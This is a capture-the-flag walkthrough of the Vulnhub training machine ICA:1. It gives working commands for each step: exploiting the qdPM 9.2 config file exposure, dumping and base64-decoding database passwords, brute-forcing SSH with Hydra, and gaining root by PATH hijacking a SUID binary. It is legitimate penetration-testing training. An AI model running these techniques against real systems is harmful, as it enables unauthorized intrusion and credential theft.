# Walkthrough for Hacking ICA:1

To view the screenshots properly on your mobile, you can zoom in.

In this walkthrough/writeup, you'll discover how to hack ICA:1, a virtual machine designed to help you sharpen your penetration testing skills. With step-by-step instructions and screenshots, you'll learn how to identify and exploit vulnerabilities, analyze traffic, and gain root access to the system.

## Solving Vulnhub Machine ICA:1 - Step-by-Step (No Audio) [lofi beats] [HERE](https://youtu.be/ct0UEmBjsyU)

**The steps:**

Here's a brief overview of the steps needed to solve this Vulnhub machine:

1. Abusing qdPM 9.2 - Password Exposure (Unauthenticated)
2. Remote connection to the MYSQL service and obtaining user credentials
3. SSH brute force with Hydra
4. Abusing relative paths in a SUID binary - Path Hijacking [Privilege Escalation]

**The walkthrough:**

Before we begin, it's worth noting that I completed this walkthrough using Arch Linux as my operating system and VirtualBox as my virtual machine software. If you're using a different operating system or virtualization software, you may encounter some differences or additional steps that aren't covered in this guide. However, the principles and techniques covered in this walkthrough should still be applicable regardless of your specific setup. With that said, let's get started!

Now let's see which ports are open on the victim's machine using NMAP:

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ipvictim
```

Now, as an attacker, I want to see what I'm up against, so I want a more thorough scan.

```shell
nmap -sCV -p22,80,3306,33060 ipvictim
```

As I see that port 80 is open, I can scan the website that says "http title: qdPM | Login" in the NMAP scan, so I will have to check it.

Let's use the `whatweb` tool to check the web server. This tool applies reconnaissance to detect the technologies running behind the website, as well as a content manager such as WordPress, Drupal, or whatever is appropriate.

```shell
whatweb http://ipvictim
```

We see that the jQuery version is a bit old - 1.10. Old versions are usually vulnerable to XSS | prototype pollution. We continue to see "http title: qdPM | Login", we search on Google to see what it is, and it turns out to be a web-based project management tool. We check the website to see what it's about.

We can see a login panel and the version of the tool, which is 9.2. We immediately search if this has a vulnerability using the command in the terminal.

```shell
searchsploit qdPM 9.2.
```

We find the vulnerability "password exposure (Unauthenticated)". We review the `.txt` file that searchsploit gives us using the following command:

```shell
searchsploit -x php/webapps/50176.txt
```

It tells us the following: The password and connection string for the database are stored in a `.yml` file. To access the `.yml` file, you can go to `http://<website>/core/config/databases.yml` file and download it.

```shell
http://ipvictim/core/config/databases.yml
```

We do what the exploit suggests and download a file when accessing the address. When we open the file, we see the names

 of the database, username, and password.

We try to connect to MySQL using the following command:

```shell
mysql -u qdpmadmin -h victim_ip -p
```

We successfully connect to the database. Let's see the exposed databases:

```shell
show databases;
```

We list the database with the name "staff":

```shell
use staff;
```

We see the tables:

```shell
show tables;
```

We check what's inside the "user" table:

```shell
select * from user;
```

We see several users and their roles, now let's check what's inside the "login" table:

```shell
select * from login;
```

We see the encrypted passwords in base64. We try to decrypt one using the following command in another terminal:

```shell
echo "c3VSSkFkR3dMcDhkeTNyRg==" | base64 -d; echo
```

We assume that the result of this command is the password. We will decrypt each password and export it to a file in the following way:

```shell
for password in c3VSSkFkR3dMcDhkeTNyRg== N1p3VjRxdGc0MmNtVVhHWA== WDdNUWtQM1cyOWZld0hkQw== REpjZVZ5OThXMjhZN3dMZw== Y3FObkJXQ0J5UzJEdUpTeQ==; do echo $password | base64 -d; echo; done | tee filename
```

We will list the users we saw in the "user" table of the database in a file. You can use nano or nvim for this. Remember to write usernames in lowercase.

If we look at the open ports, we see that port 22 is open and the service is SSH. We will try to connect to the machine with these users using Hydra. We will play with the user and password lists we just created to see which one works:

```shell
hydra -L user_file -P password_file ssh://victim_ip
```

We see that two users are correct. Now we have a way to connect to the machine with SSH.

```shell
ssh travis@victim_ip
```

We enter the password when prompted. We have a successful connection.

Now we will check that we are on the victim's machine with the command:

```shell
hostname -I
```

We are indeed logged into the victim's machine.

Now we list the files this user has:

```shell
ls
```

There is a file called "user.txt", we open it with the command:

```shell
cat user.txt
```

It only says "ICA {secret project}". So now we will check what files the other user has, we use the command:

```shell
sudo dexter
```

We enter the password when prompted.

We go to the home directory with the command `cd` and check what is there with the command `ls`. We see that there is a file called "note.txt". We open it with the command `cat note.txt`. The note tells us that the contents of the executables are partially visible. They are giving us a hint that there is a binary here, and we need to take advantage of it.

We move using the command `cd /` and we will search for files whose privilege is SUID and owner is root with the command:

```shell
find -perm -4000 -user root 2>/dev/null
```

We find a suspicious file `./opt/get_access`. Let's check the privileges of this file

:

```shell
ls -l ./opt/get_access
```

We realize that the owner is root and it has SUID privilege. We will execute it:

```shell
/opt/get_access
```

It gives us some data, so we try to use "strings" to list the printable character strings of this binary:

```shell
strings /opt/get_access
```

We find "cat /root/system.info". The binary is playing with "cat" to represent the contents of a file. But if we look more closely, "cat" has its absolute path "/usr/bin/cat" and is referenced relative to the binary, so we can try to do a Hijacking Relative Paths in SUID Programs.

So we can hijack the binary in the following way:

```shell
cd /tmp/
```

Create your own "cat":

```shell
touch cat
```

Give it execution permissions:

```shell
chmod +x cat
```

Then we play with the "PATH":

```shell
export PATH=/tmp:$PATH
```

Now when we execute the binary, since it executed "cat" relatively, it will now execute our own "cat" and since the owner is "root" and it is an "SUID" binary, we can alter the content of our "cat" to assign "SUID" privilege to "bash". We open our "cat" and write the following in it: `chmod u+s /bin/bash`. If you can't use nano to edit the file, write `export TERM=xterm` and press enter. We close the file and proceed to execute the binary `/opt/get_access`, and it tells us:

```shell
"All services are disabled. Accessing to the system is allowed..."
```

If we check the permissions of "bash":

```shell
ls -l /bin/bash
```

We see that it is now SUID, and now we can literally do whatever we want.

```shell
bash -p
```

We return the "cat" PATH to its normal state:

```shell
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games/:/usr/games
```

We look for the "root.txt" file and have successfully completed the machine!
